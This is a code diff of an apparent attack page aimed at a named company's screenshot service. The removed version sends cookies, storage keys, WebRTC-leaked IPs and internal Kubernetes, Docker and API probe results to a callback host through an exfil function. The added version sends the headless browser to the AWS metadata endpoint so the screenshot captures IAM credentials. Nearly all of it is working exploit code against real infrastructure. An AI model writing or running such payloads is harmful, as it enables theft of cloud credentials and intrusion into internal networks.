@@ -9,51 +9,10 @@ function exfil(tag, data) {
   try { var x = new XMLHttpRequest(); x.open('GET', CB + '/x?t=' + encodeURIComponent(tag) + '&d=' + enc, false); x.send(); } catch(e) {}
 }
 
-function hold(label) {
-  var x = new XMLHttpRequest();
-  x.open('GET', CB + '/hold?l=' + encodeURIComponent(label), false);
-  try { x.send(); } catch(e) {}
-}
+exfil('start', 'v5-navigate-imds');
 
-exfil('start', 'v4-alive');
-exfil('ua', navigator.userAgent);
-exfil('cookie', document.cookie || '(empty)');
-exfil('ls', JSON.stringify(Object.keys(localStorage || {})));
-exfil('ss', JSON.stringify(Object.keys(sessionStorage || {})));
-
-var webrtcIPs = [];
-try {
-  var pc = new RTCPeerConnection({iceServers: [{urls: 'stun:xtugidit39jm7kmw4cl0ut51fslk99.oastify.com:3478'}]});
-  pc.onicecandidate = function(e) { if (e && e.candidate) webrtcIPs.push(e.candidate.candidate); };
-  pc.createDataChannel('probe');
-  pc.createOffer().then(function(o) { return pc.setLocalDescription(o); });
-} catch(e) { exfil('webrtc-err', e.message); }
-
-var ar = {};
-function ap(tag, url) {
-  fetch(url, {mode: 'no-cors', cache: 'no-store'})
-    .then(function(r) { ar[tag] = 'ok:' + r.status + ':' + r.type; })
-    .catch(function(e) { ar[tag] = 'err:' + e.message; });
-}
-
-ap('k8s-443',    'https://kubernetes.default.svc/');
-ap('k8s-6443',   'https://kubernetes.default.svc:6443/');
-ap('k8s-kubelet','https://localhost:10250/');
-ap('k8s-etcd',   'https://localhost:2379/');
-ap('docker-gw',  'https://172.17.0.1/');
-ap('lo-443',     'https://localhost/');
-ap('lo-8443',    'https://localhost:8443/');
-ap('lo-9443',    'https://localhost:9443/');
-ap('screenshooter-api', 'https://screenshooter.dev.stravito.com/api/');
-ap('int-api',    'https://internal.api.stravito.com/api/v1/');
-
-hold('h1'); hold('h2'); hold('h3');
-exfil('async1', JSON.stringify(ar));
-exfil('webrtc1', JSON.stringify(webrtcIPs));
-
-hold('h4'); hold('h5'); hold('h6'); hold('h7'); hold('h8'); hold('h9'); hold('h10');
-exfil('async2', JSON.stringify(ar));
-exfil('webrtc2', JSON.stringify(webrtcIPs));
-exfil('done', 'v4-complete');
+// Navigate Chrome to AWS IMDS - the screenshooter will screenshot the response
+// Puppeteer follows the navigation and the thumbnail captures the plaintext credentials
+window.location.href = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
 </script>
 </html>
